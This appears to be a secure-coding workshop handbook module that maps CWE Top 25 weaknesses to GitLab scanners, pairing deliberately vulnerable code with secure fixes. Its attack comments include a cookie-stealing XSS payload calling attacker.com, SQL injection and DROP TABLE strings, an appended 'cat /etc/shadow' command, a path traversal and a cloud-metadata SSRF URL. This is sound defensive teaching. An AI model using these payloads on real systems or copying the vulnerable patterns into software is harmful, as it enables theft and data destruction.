# STUDENT HANDBOOK — MODULE 9
## SANS/CWE Top 25: Root Causes, Vulnerable Patterns, and GitLab Detection

---

**Workshop:** GitLab Ultimate for Secure SDLC, DevSecOps, AI, Robotics & IoT
**Day:** 2 of 2 | **Module:** 9 of 16 | **Duration:** 75 minutes

---

## Learning Objectives

- Define the key CWE weaknesses with code-level root cause analysis
- Identify vulnerable code patterns and write the secure alternative
- Understand what a SAST rule pattern-matches and why
- Map CWE IDs to GitLab scanner capabilities
- Apply knowledge to identify weaknesses in the lab vulnerable application

---

## OWASP vs CWE — The Distinction

| Framework | Level | What It Describes | Used By |
|---|---|---|---|
| OWASP Top 10 | Application | Vulnerability categories (e.g., "Injection") | Security architects, appsec teams |
| CWE Top 25 | Code | Root cause weaknesses (e.g., "SQL Injection, CWE-89") | SAST tools, developers, code reviewers |

> **Rule of thumb:** OWASP tells you *what category* of vulnerability to expect. CWE tells you *exactly what code pattern* caused it. SAST tools report in CWE IDs — knowing them makes findings immediately actionable.

**Reference:** https://cwe.mitre.org/top25/

---

## Priority CWE Weaknesses — Developer Reference

---

### CWE-89: SQL Injection

**Root Cause:** SQL query built by concatenating user-controlled strings.

```python
# ❌ VULNERABLE — CWE-89
query = "SELECT * FROM users WHERE username='" + username + "'"
# Attack: username = "admin' OR '1'='1" → dumps all users
# Attack: username = "'; DROP TABLE users; --" → destroys data

# ✅ SECURE — parameterised query
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
# User input is DATA, never interpreted as SQL syntax
```

**What SAST looks for:** String concatenation (`+`, `%`, f-strings) in `execute()`, `query()`, `cursor()` calls.
**GitLab:** SAST via `Jobs/SAST.gitlab-ci.yml`

---

### CWE-79: Cross-Site Scripting (XSS)

**Root Cause:** User-supplied data rendered directly into HTML without encoding.

```python
# ❌ VULNERABLE — CWE-79
return f"<h1>Welcome {username}</h1>"
# Attack: username = "<script>fetch('http://attacker.com/?c='+document.cookie)</script>"

# ✅ SECURE — auto-escaped template engine
return render_template("welcome.html", username=username)
# Jinja2: {{ username }} → HTML-escaped: &lt;script&gt;... never executes
```

**GitLab:** SAST + DAST

---

### CWE-78: OS Command Injection

**Root Cause:** User input passed to a shell command without sanitisation.

```python
# ❌ VULNERABLE — CWE-78
subprocess.run(f"ping {host}", shell=True)
# Attack: host = "8.8.8.8; cat /etc/shadow"

# ✅ SECURE — list args, shell=False, validate input
import re
if not re.match(r'^[\w.\-]+$', host):
    raise ValueError("Invalid hostname")
subprocess.run(["ping", "-c", "3", host], shell=False)
```

**What SAST looks for:** `shell=True` with a non-literal string argument; `os.system()` with variables.
**GitLab:** SAST

---

### CWE-22: Path Traversal

**Root Cause:** File path built from user input without verifying it stays within intended directory.

```python
# ❌ VULNERABLE — CWE-22
path = os.path.join('/app/files', user_filename)
open(path)  # filename = "../../etc/passwd" → reads /etc/passwd

# ✅ SECURE — resolve and validate
BASE = '/app/files'
resolved = os.path.realpath(os.path.join(BASE, user_filename))
if not resolved.startswith(BASE + os.sep):
    raise PermissionError("Access denied")
open(resolved)
```

**GitLab:** SAST

---

### CWE-798: Use of Hardcoded Credentials

**Root Cause:** Passwords, API keys, tokens embedded directly in source code.

```python
# ❌ VULNERABLE — CWE-798
API_KEY = "sk-prod-abc123xyz789"        # In code = in git history = exposed
DB_PASS = "MySecretPassword123!"

# ✅ SECURE — environment variables
API_KEY = os.environ['API_KEY']          # Set in GitLab CI/CD Variable (masked)
DB_PASS = os.environ['DATABASE_PASSWORD']
```

> **Critical:** Removing a hardcoded secret from source does NOT remove it from `git log`. The correct remediation: remove the secret AND rotate/revoke the credential — assume it was already read.

**GitLab:** Secret Detection (Gitleaks) via `Jobs/Secret-Detection.gitlab-ci.yml`

---

### CWE-327: Use of Broken/Risky Cryptographic Algorithm

**Root Cause:** Using MD5 or SHA1 for password hashing, or DES/ECB for encryption. These are broken for security-sensitive use.

```python
# ❌ VULNERABLE — CWE-327
password_hash = hashlib.md5(password.encode()).hexdigest()
# MD5 hashes of common passwords crack in milliseconds with GPU

# ❌ ALSO VULNERABLE — unsalted SHA1
password_hash = hashlib.sha1(password.encode()).hexdigest()

# ✅ SECURE — use a password hashing function
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# bcrypt is designed for passwords: slow by design, salted automatically

# ✅ ALSO SECURE
from argon2 import PasswordHasher
ph = PasswordHasher()
password_hash = ph.hash(password)  # Argon2id — winner of Password Hashing Competition
```

**GitLab:** SAST (detects `hashlib.md5`, `hashlib.sha1` in password context)

---

### CWE-502: Deserialization of Untrusted Data

**Root Cause:** Deserialising an attacker-controlled payload using a format that allows code execution.

```python
# ❌ CRITICAL — CWE-502 — Remote Code Execution possible
data = request.get_data()
obj = pickle.loads(data)       # Attacker controls __reduce__() → arbitrary code
obj = yaml.load(data)          # PyYAML without Loader= → code execution
obj = marshal.loads(data)      # marshal is not safe for untrusted input

# ✅ SECURE — JSON for untrusted input
data = request.get_json()      # JSON has no code execution capability
# Validate schema explicitly after parsing
```

**GitLab:** SAST (detects `pickle.loads`, unsafe `yaml.load`)

---

### CWE-476: NULL Pointer Dereference (C/C++ — Embedded)

**Root Cause:** Pointer used without first checking if it is NULL. Critical in embedded firmware.

```c
/* ❌ VULNERABLE — CWE-476 */
void process_sensor_data(sensor_data_t *data) {
    printf("Sensor value: %f\n", data->value);  /* Crash if data is NULL */
}

/* ✅ SECURE — always validate pointers */
void process_sensor_data(sensor_data_t *data) {
    if (data == NULL) {
        log_error("NULL sensor data received");
        return;
    }
    printf("Sensor value: %f\n", data->value);
}
```

**Embedded relevance:** A NULL dereference in a robot controller handling network messages can cause a hard fault, requiring manual intervention to restart the system.

**GitLab:** SAST (C/C++ analyzers — Semgrep, Flawfinder)

---

### CWE-787/125: Out-of-Bounds Write/Read (Memory Safety — C/C++)

**Root Cause:** Buffer accessed beyond its allocated size — classic buffer overflow.

```c
/* ❌ VULNERABLE — CWE-787 (write beyond buffer) */
void process_command(const char *input) {
    char buffer[64];
    strcpy(buffer, input);   /* Overflow if input > 63 chars */
    /* Stack smashing → overwrite return address → RCE */
}

/* ✅ SECURE — bounds-checked copy */
void process_command(const char *input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';  /* Ensure null termination */
}

/* ✅ BETTER — use strlcpy (OpenBSD) or snprintf */
snprintf(buffer, sizeof(buffer), "%s", input);
```

**Embedded relevance:** Buffer overflows in firmware that processes incoming network packets (MQTT, CoAP, HTTP, BLE) are common RCE vectors in IoT devices.

**GitLab:** SAST (detects `strcpy`, `sprintf`, `gets` — unsafe C string functions)

---

### CWE-306: Missing Authentication for Critical Function

**Root Cause:** A sensitive or destructive endpoint has no authentication check.

```python
# ❌ VULNERABLE — CWE-306
@app.route('/admin/factory-reset', methods=['POST'])
def factory_reset():
    # No authentication — anyone can call this!
    reset_all_devices()
    return jsonify({'status': 'all devices reset'})

# ✅ SECURE
@app.route('/admin/factory-reset', methods=['POST'])
@require_admin_role          # Authentication AND authorisation
@require_mfa                 # MFA for destructive operations
def factory_reset():
    audit_log.critical(f"Factory reset initiated by {current_user.id}")
    reset_all_devices()
    return jsonify({'status': 'all devices reset'})
```

**GitLab:** SAST (missing auth decorator pattern), DAST (ZAP discovers unauthenticated admin endpoints)

---

### CWE-918: Server-Side Request Forgery

**Root Cause:** Server makes HTTP request to a URL controlled by the attacker.

```python
# ❌ VULNERABLE — CWE-918
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    return requests.get(url).text
    # Attack: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# ✅ SECURE — validate URL before fetching
ALLOWED_DOMAINS = {'api.example.com', 'partner.example.org'}

def validate_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    return (parsed.scheme == 'https' and 
            parsed.hostname in ALLOWED_DOMAINS)

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    if not validate_url(url):
        return jsonify({'error': 'URL not permitted'}), 403
    return requests.get(url, allow_redirects=False).text
```

**GitLab:** SAST, DAST

---

## CWE Top 25 → GitLab Quick Reference

| CWE ID | Weakness | GitLab Scanner | Template |
|---|---|---|---|
| CWE-787 | Out-of-Bounds Write | SAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-79 | XSS | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-125 | Out-of-Bounds Read | SAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-78 | Command Injection | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-89 | SQL Injection | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-22 | Path Traversal | SAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-502 | Unsafe Deserialization | SAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-798 | Hardcoded Credentials | Secret Detection | `Jobs/Secret-Detection.gitlab-ci.yml` |
| CWE-327 | Broken Crypto | SAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-476 | NULL Dereference | SAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-787 | Buffer Overflow | SAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-306 | Missing Auth | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| CWE-918 | SSRF | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |

> Full mapping: `09_Mapping_Tables/CWE_Top25_to_GitLab_Mapping.md`

---

## Lab Exercise — Identify the Weakness

Open `07_Vulnerable_Apps/M09_M10_vulnerable_robovision_app.py`.

For each vulnerable function, answer:
1. Which CWE does this represent?
2. What line does the vulnerability occur on?
3. What would the SAST rule pattern-match on?
4. What is the secure fix?

| Function | CWE | Vulnerable Line | Fix |
|---|---|---|---|
| `login()` SQL | | | |
| `login()` password | | | |
| `ping_diagnostic()` | | | |
| `get_log()` | | | |
| `restore_session()` | | | |
| `register_webhook()` | | | |
| `reset_all_robots()` | | | |
| Hardcoded at top | | | |

---

## References

1. CWE Top 25 — https://cwe.mitre.org/top25/
2. GitLab SAST Analyzers — https://docs.gitlab.com/ee/user/application_security/sast/analyzers.html
3. GitLab Secret Detection — https://docs.gitlab.com/ee/user/application_security/secret_detection/
4. Semgrep Rules Repository — https://semgrep.dev/explore
5. OWASP Cheat Sheet Series — https://cheatsheetseries.owasp.org/
